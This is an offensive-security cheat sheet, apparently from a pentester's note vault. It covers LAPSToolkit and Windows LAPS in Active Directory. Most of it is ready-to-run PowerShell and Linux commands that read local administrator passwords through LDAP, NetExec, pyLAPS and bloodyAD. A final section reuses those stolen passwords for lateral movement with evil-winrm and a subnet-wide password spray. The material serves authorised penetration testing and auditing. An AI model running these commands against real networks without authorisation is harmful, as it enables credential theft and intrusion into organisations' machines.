# LAPSToolkit

**Tags:** `#lapstoolkit` `#laps` `#activedirectory` `#credentials` `#localadmin` `#powershell` `#postexploitation`

PowerShell toolkit leveraging PowerView to audit and attack LAPS (Local Administrator Password Solution) deployments. Finds computers with LAPS enabled, identifies which accounts can read LAPS passwords, and reads those passwords if the current user has permission. LAPS is extremely common in enterprise environments — always check it.

**Source:** https://github.com/leoloobeek/LAPSToolkit
**Install:**
```powershell
git clone https://github.com/leoloobeek/LAPSToolkit
Import-Module .\LAPSToolkit.ps1
# Requires PowerView — Import-Module .\PowerView.ps1 first
```

> [!note] **What is LAPS?** LAPS rotates the local Administrator password on domain-joined computers and stores it in AD. Only specific users/groups are delegated read access. If your current account has read rights, you get local admin on those machines.

> [!warning] **Two LAPS generations — LAPSToolkit only knows the OLD one.** This toolkit reads the **Legacy LAPS** attribute `ms-Mcs-AdmPwd` (the standalone MSI product). Since April 2023, **Windows LAPS** is built into Windows/AD and uses **different attributes** — `Get-LAPSComputers` returns nothing against a Windows-LAPS domain even when you *can* read the password. Know both, and check both attributes:
>
> | | Legacy LAPS (MSI) | Windows LAPS (built-in, 2023+) |
> |---|---|---|
> | Password attr | `ms-Mcs-AdmPwd` | `msLAPS-Password` (cleartext) / `msLAPS-EncryptedPassword` (DPAPI-NG) |
> | Expiry attr | `ms-Mcs-AdmPwdExpirationTime` | `msLAPS-PasswordExpirationTime` |
> | Reads via | LAPSToolkit, PowerView | native `Get-LapsADPassword`, NetExec `--laps`, pyLAPS, bloodyAD |
>
> `msLAPS-EncryptedPassword` is DPAPI-NG-encrypted — only the delegated principals can decrypt it (NetExec/`LAPS.py` will if you're one of them). If it comes back as `msLAPS-Password` in cleartext, encryption was never enabled. See the **Windows LAPS** section below.

---

## Find LAPS-Enabled Computers

```powershell
# All computers with LAPS enabled (ms-Mcs-AdmPwd attribute is set)
Get-LAPSComputers
# Returns: ComputerName, Enabled, Password (if readable), ExpirationTimestamp

# LAPS computers with readable passwords for current user
Get-LAPSComputers | Where-Object {$_.Password -ne $null}

# Specific computer
Get-LAPSComputers -ComputerName DC01
```

---

## Find Who Can Read LAPS Passwords

```powershell
# Find all groups and users delegated to read ms-Mcs-AdmPwd
Find-LAPSDelegatedGroups
# Returns: OUDistinguishedName, Groups that can read LAPS in that OU

# Extended rights on OUs — shows who has All Extended Rights (can read LAPS)
Find-AdmPwdExtendedRights
# Returns: ComputerName, OUDistinguishedName, Identity (account with rights)
```

---

## Read LAPS Passwords

```powershell
# Read LAPS password for all accessible computers
Get-LAPSComputers | Select-Object ComputerName, Password, ExpirationTimestamp

# Read password for a specific computer
Get-LAPSComputers -ComputerName WKSTN01 | Select-Object Password

# Quick one-liner — find all readable LAPS passwords
Get-LAPSComputers | Where-Object {$_.Password} | Select-Object ComputerName, Password
```

---

## Windows LAPS (built-in, 2023+) — reading `msLAPS-Password`

LAPSToolkit won't see these. Use native cmdlets or modern tooling:

```powershell
# Native cmdlet (Windows LAPS PowerShell module — on any recent domain-joined host)
Get-LapsADPassword -Identity WKSTN01 -AsPlainText
# Returns: ComputerName, Account (managed local admin), Password, ExpirationTimestamp

# All computers you can read, via PowerView on the new attributes
Get-DomainComputer -Properties name,msLAPS-Password,msLAPS-PasswordExpirationTime |
  Where-Object {$_.'msLAPS-Password'} |
  Select-Object name, 'msLAPS-Password'
```

```bash
# NetExec — the fastest sweep; handles BOTH cleartext and DPAPI-NG-encrypted (if you're delegated)
nxc ldap <dc-ip> -u jsmith -p 'Password123!' --laps
nxc smb  <dc-ip> -u jsmith -p 'Password123!' -M laps          # then reuse as local admin

# pyLAPS (p0dalirius) — get / set the managed password from Linux
python3 pyLAPS.py --action get -d corp.local -u jsmith -p 'Password123!' --dc-ip 10.10.10.10

# bloodyAD — read either attribute
bloodyAD -u jsmith -p 'Password123!' -d corp.local --host 10.10.10.10 \
  get object WKSTN01 --attr msLAPS-Password

# ldapsearch — Windows LAPS attribute
ldapsearch -x -H ldap://<dc-ip> -D 'CORP\jsmith' -w 'Password123!' \
  -b 'DC=corp,DC=local' '(msLAPS-Password=*)' name msLAPS-Password
```

> [!tip] **Who can read it?** The BloodHound `ReadLAPSPassword` edge answers this directly for both LAPS generations — run it before hunting by hand. See [[Tools/AD/BloodHound|BloodHound]].

---

## Using Stolen LAPS Credentials

```bash
# Once you have the local Administrator password, use it for lateral movement
evil-winrm -i <target-ip> -u Administrator -p '<LAPS-password>'

# NetExec (the vault standard; crackmapexec/CME is superseded — nxc is a drop-in)
nxc smb <target-ip> -u Administrator -p '<LAPS-password>' --local-auth

# Spray the same password across the subnet (reuse before/around LAPS rollout)
nxc smb 192.168.1.0/24 -u Administrator -p '<LAPS-password>' --local-auth
```

---

## Check LAPS Status via Registry (on target)

```powershell
# --- Legacy LAPS (MSI) ---
Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft Services\AdmPwd" -ErrorAction SilentlyContinue
# AdmPwdEnabled = 1 → legacy LAPS active on this machine
Test-Path "C:\Program Files\LAPS\CSE\AdmPwd.dll"        # legacy client DLL

# --- Windows LAPS (built-in, 2023+) ---
Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\LAPS\State" -ErrorAction SilentlyContinue
Get-ItemProperty "HKLM:\Software\Microsoft\Policies\LAPS" -ErrorAction SilentlyContinue   # GPO-configured policy
Get-Command -Module LAPS   # native module present → Windows LAPS in use
```

---

## Manual LDAP Approach (no toolkit needed)

```powershell
# Read LAPS password directly via LDAP (PowerView)
Get-DomainComputer WKSTN01 -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime,name | Select-Object

# All computers with readable LAPS passwords
Get-DomainComputer -Properties name,ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime |
  Where-Object {$_.'ms-Mcs-AdmPwd' -ne $null} |
  Select-Object name, 'ms-Mcs-AdmPwd', 'ms-Mcs-AdmPwdExpirationTime'
```

```bash
# From Linux via ldapsearch
ldapsearch -x -H ldap://<dc-ip> -D 'DOMAIN\user' -w 'Password' \
  -b 'DC=domain,DC=local' \
  '(ms-MCS-AdmPwd=*)' \
  sAMAccountName ms-MCS-AdmPwd ms-MCS-AdmPwdExpirationTime
```

---

> [!note] **See also** — LAPSToolkit is a [[Tools/AD/PowerView|PowerView]] wrapper (import PowerView first). Confirm *who can read* a machine's LAPS password fast with the `ReadLAPSPassword` edge in [[Tools/AD/BloodHound|BloodHound]]. Reuse the recovered local-admin password with [[Tools/Lateral Movement/Evil WinRM|Evil WinRM]] / NetExec (see [[Services/Active Directory/ACL Abuse|ACL Abuse]] for how the read delegation is often granted).

---

*Created: 2026-03-06*
*Updated: 2026-08-27*
*Model: claude-opus-5*
